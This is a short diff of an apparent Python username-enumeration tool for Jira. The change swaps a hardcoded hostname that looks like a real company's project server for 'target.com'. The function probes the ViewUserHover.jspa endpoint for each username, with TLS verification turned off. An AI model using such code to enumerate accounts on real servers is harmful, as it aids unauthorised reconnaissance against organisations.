@@ -51,7 +51,7 @@ def processor(q, ):
 
 def ex_user_name(q, user):
     b = Queue(maxsize=0)
-    session_url="http://projects.zaeemsolutions.com"
+    session_url="http://target.com"
     try:
         response = requests.get(session_url + "/secure/ViewUserHover.jspa?username={}".format(user), allow_redirects=True,
                                 timeout=15, verify=False)
